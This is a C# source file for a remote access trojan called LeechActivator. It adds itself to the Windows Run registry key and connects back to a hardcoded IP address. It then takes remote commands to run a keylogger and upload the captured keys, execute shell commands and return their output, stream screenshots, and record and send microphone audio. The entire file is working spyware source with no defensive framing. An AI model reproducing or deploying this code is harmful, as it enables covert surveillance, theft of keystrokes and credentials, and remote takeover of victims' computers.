using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Sockets;
using System.Net;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Reflection;
using Microsoft.Win32;
namespace LeechActivator
{
    class LeechActivator
    {
        [DllImport("winmm.dll")]
        private static extern int mciSendString(string MciComando, string MciRetorno, int MciRetornoLeng, int Callback);

        [DllImport(".\\Leech.dll")]
        public static extern void setHook();

        [DllImport(".\\Leech.dll")]
        public static extern void unsetHook();

        [DllImport(".\\Leech.dll")]
        public static extern void launchCmd();

        [DllImport(".\\Leech.dll")]
        public static extern void killCmd();
        
        [DllImport(".\\Leech.dll")]
        public static extern void cmdExec([MarshalAs(UnmanagedType.AnsiBStr)] String cmd);
        //public static extern IntPtr cmdExec([MarshalAs(UnmanagedType.AnsiBStr)] String cmd);

        [DllImport(".\\Leech.dll")]
        public static extern void captureAnImage();


        Socket tcpUserSocket = null;
      

        public void captureManager() {

            while (true)
            {
                

                captureAnImage();
                 if(File.Exists(".\\capture.jpeg"))
                try
                {
                    File.Delete(".\\capture.jpeg");
                }
               
                catch (IOException e) { System.Console.WriteLine(e.Message); }
                   

                Bitmap bmp = new Bitmap(".\\capture.bmp");
                bmp.Save(".\\capture.jpeg", ImageFormat.Jpeg);
                bmp.Dispose();

                byte[] message = File.ReadAllBytes(".\\capture.jpeg");


                try
                {

                    tcpUserSocket.Send(message);

                }
                catch (Exception e)
                {
                    return;
                }


             

                Thread.Sleep(2000);

               
            }
        
        }


        public void soundManager()
        {

           
            while (true)
            {
             
            mciSendString("open new type waveaudio alias Som",null,0,0);
            mciSendString("record Som", null, 0, 0);
            Thread.Sleep(15000);
            Console.WriteLine("escreveu!!!!");
            mciSendString("pause Som", null, 0, 0);

            mciSendString("save Som .\\sound.wav", null, 0, 0);
            mciSendString("close Som", null, 0, 0);

              

               byte[] message = null;
               if (File.Exists(".\\sound.wav"))
                    try
                    {
                        message = File.ReadAllBytes(".\\sound.wav");
                    }
                    catch (IOException e) { System.Console.WriteLine(e.Message); }


               try
               {
                   tcpUserSocket.Send(message);
               }
               catch (IOException e)
               {
                   return;
               }
                

                try
                {
                    File.Delete(".\\sound.wav");
                }
                catch (IOException e) { System.Console.WriteLine(e.Message); }


            }

        }


          

        public static void Main(string[] args)
        {



            String ipAddress = "169.254.54.149";
            int port = 9000;

            String currentDir = Application.StartupPath;
            System.Console.WriteLine(currentDir);


            bool isReg = false;
            //CurrentUser or LocalMachine 
            RegistryKey regApp = null;
            try
            {
                regApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
           
            if (regApp.GetValue("LeechActivator") == null)
            {
                regApp.SetValue("LeechActivator", currentDir + "\\LeechActivator.exe");

            }
           
            if (regApp.GetValue("LeechActivator") == null)
            {
                isReg = false;
                System.Console.WriteLine("Failed to add to registry!!!!!");
                Console.ReadKey();
                return;
            }
            else
            {
                isReg = true;
                System.Console.WriteLine("Exe added to registry.");
               
            }

            }
            catch (Exception e) { Console.WriteLine(e.Message); }

      

            LeechActivator activator = new LeechActivator();
            Thread hookThread = null;
            Thread asyncImageCapture = null;
            Thread asyncSoundCapture = null;
            
            activator.tcpUserSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            
            IPAddress ipaddress = null;
            try
            {
                ipaddress = IPAddress.Parse(ipAddress);

            }
            catch (Exception e) {

                System.Console.WriteLine(e.Message);
                Environment.Exit(1);
            
            }



            if((port < 0) || (port > 65535))
            {
                System.Console.WriteLine("Invalid port. Will now exit!");
                System.Console.ReadKey();
                Environment.Exit(1);
            
            }


            while (!activator.tcpUserSocket.Connected)
            {

                try
                {
                    activator.tcpUserSocket.Connect(ipaddress,port);
                    
            
                }catch(Exception e) {
                    Console.WriteLine(e.Message);
                    Thread.Sleep(5000);
            
                }
            
            }

            while(true){

                byte[] message = new byte[50];
                
                           
                            while (true)
                            {

                                try
                                {
                                    activator.tcpUserSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                    ipaddress = IPAddress.Parse(ipAddress);
                                    activator.tcpUserSocket.Connect(ipaddress, port);
                                    break;
                                }

                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                    Thread.Sleep(5000);
                                }

                            }
                       

                try
                {
                    activator.tcpUserSocket.Receive(message);
                }
                catch (Exception e)
                {
                    System.Console.WriteLine(e.Message);
                }

           

                String command = System.Text.Encoding.ASCII.GetString(message);
                String replaced = command.Replace("\0", String.Empty);
                System.Console.WriteLine(replaced);
                Regex consoleReg = new Regex("2 interact .*");
                Match consoleMatch = consoleReg.Match(replaced);
                byte[] cmdOutput = null;
                if (consoleMatch.Length != 0) //console command
                {
                    
                    String outPath = "\"" + currentDir + "\\out.txt" + "\"";
                    System.Console.WriteLine(outPath);
                    cmdExec(consoleMatch.Value.Replace("2 interact ", String.Empty) + " >> " + outPath + "\n");

                    Thread.Sleep(1000);
                    if (File.Exists(".\\out.txt"))
                    {
                        while (true)
                        {
                            try
                            {
                                
                                cmdOutput = File.ReadAllBytes(".\\out.txt");
                                if ((cmdOutput.Length == 0) || (cmdOutput == null))
                                    cmdOutput = Encoding.ASCII.GetBytes(" ");
                                System.Console.WriteLine("FIle has been read!!!!");
                                    break;
                                
                            }
                            catch (Exception e) { continue; }
                        }
                    }

                    else cmdOutput = Encoding.ASCII.GetBytes("Console is dead or malfunctioning.");
                   

                    try
                    {
                        
                        activator.tcpUserSocket.Send(cmdOutput);
                        File.Delete(".\\out.txt");

                    }catch(Exception e){
                    
                    }
                    
                    System.Console.WriteLine("Command executed");
                    continue;
                   
                    
                }



                switch (replaced) { 
                    case "1 start":
                        hookThread = new Thread(setHook);
                        hookThread.Start();
                        System.Console.WriteLine("Started Keylogger");
                        break;
                    case "1 stop":
                        unsetHook();
                        hookThread.Abort();
                        System.Console.WriteLine("Stopped Keylogger");
                        if (File.Exists(".\\LoggedKeys.txt"))
                        {
                            File.Delete(".\\LoggedKeys.txt");
                        }
                        break;
                    case "1 download":                        
                        byte[] file = null;
                        
                        if (File.Exists(".\\LoggedKeys.txt"))
                        {
                            file = File.ReadAllBytes(".\\LoggedKeys.txt");

                            try
                            {
                                activator.tcpUserSocket.Send(file);
                                System.Console.WriteLine("Downloaded Keys");
                                File.Delete(".\\LoggedKeys.txt");
                            }
                            catch (Exception e)
                            {
                                //TODO: 
                            }
                        
                        }
                        else
                        {

                            try
                            {
                                activator.tcpUserSocket.Send(Encoding.ASCII.GetBytes(""));
                            }
                            catch (Exception e)
                            {
                                //TODO: 
                            }
                            
                        }
                        break;
                    case "2 start":
                        launchCmd();
                        break;
                    case "2 stop":
                        killCmd();
                        break;
                    case "3 start":
                        asyncImageCapture = new Thread(activator.captureManager);
                        asyncImageCapture.Start();
                        System.Console.WriteLine("Started capture");
                        break;
                    case "3 stop":
                        if(asyncImageCapture != null)
                        asyncImageCapture.Abort();
                        System.Console.WriteLine("Stopped capture");
                        break;
                    case "4 start":
                        asyncSoundCapture = new Thread(activator.soundManager);
                        asyncSoundCapture.Start();
                        System.Console.WriteLine("Started capture");
                        break;
                    case "4 stop":
                        asyncSoundCapture.Abort();
                        System.Console.WriteLine("Stopped capture");
                        break;



                    default:
                        System.Console.WriteLine("Unimplemented option");
                        break;  
                }
                while (!activator.tcpUserSocket.Connected)
                {
                    try
                    {
                        activator.tcpUserSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        ipaddress = IPAddress.Parse(ipAddress);
                        activator.tcpUserSocket.Connect(ipaddress, Convert.ToInt16(port));
                        break;

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                        Thread.Sleep(5000);

                    }
                }
  
            }
        }
    }
}

